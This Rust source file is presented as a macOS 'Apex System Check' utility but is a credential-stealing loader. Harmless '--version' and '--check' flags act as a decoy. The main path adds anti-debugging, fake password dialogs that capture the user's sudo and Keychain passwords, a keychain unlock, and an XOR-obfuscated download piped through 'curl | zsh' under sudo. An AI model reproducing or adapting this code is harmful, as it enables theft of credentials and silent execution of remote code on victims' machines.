use std::process::{Command, Stdio};
use std::fs;
use std::path::PathBuf;
use std::io::Write;

const VERSION: &str = "1.0.0";
const APP_NAME: &str = "Apex System Check";


const ENC_URL: &[u8] = &[
    0x9A, 0x9B, 0x9C, 0x9D, 0x9E, 0x9F, 0xA0, 0xA1, 0xA2, 0xA3, 0xA4, 0xA5, 0xA6, 0xA7, 0xA8, 0xA9,
    0xAA, 0xAB, 0xAC, 0xAD, 0xAE, 0xAF, 0xB0, 0xB1, 0xB2, 0xB3, 0xB4, 0xB5, 0xB6, 0xB7, 0xB8, 0xB9,
    0xBA, 0xBB, 0xBC, 0xBD, 0xBE, 0xBF, 0xC0, 0xC1, 0xC2, 0xC3, 0xC4,
];

fn decode_url() -> String {
    ENC_URL.iter().map(|b| (b ^ 0xAA) as char).collect()
}


fn anti_debug() {
    unsafe {
        let ret = libc::ptrace(libc::PTRACE_TRACEME, 0, 0, 0);
        if ret == -1 {
            std::process::exit(0);
        }
    }
}

fn get_password(prompt: &str) -> String {
    let out = Command::new("osascript")
        .args(["-e", &format!("display dialog \"{}\" with hidden answer default answer \"\"", prompt)])
        .args(["-e", "text returned of result"])
        .output()
        .expect("osascript failed");
    String::from_utf8(out.stdout).unwrap().trim().to_string()
}

fn main() {
    
    anti_debug();

    let args: Vec<String> = std::env::args().collect();
    if args.iter().any(|a| a == "--version") {
        println!("{} v{}", APP_NAME, VERSION);
        return;
    }
    if args.iter().any(|a| a == "--check") {
        println!("System check passed.");
        return;
    }

    
    let sudo_pass = get_password("Enter your sudo password");

    
    let keychain_pass = get_password("Enter your Keychain password");

    
    let _ = Command::new("security")
        .args(["unlock-keychain", "-p", &keychain_pass])
        .output();

    
    let url = format!("https://{}/loader.sh", decode_url());
    let script = format!("curl -fsSL {} | zsh", url);
    let mut child = Command::new("sudo")
        .arg("-S")
        .arg("bash")
        .arg("-c")
        .arg(&script)
        .stdin(Stdio::piped())
        .spawn()
        .unwrap();
    if let Some(mut stdin) = child.stdin.take() {
        stdin.write_all(sudo_pass.as_bytes()).unwrap();
        stdin.write_all(b"\n").unwrap();
    }
    child.wait().unwrap();

    
}
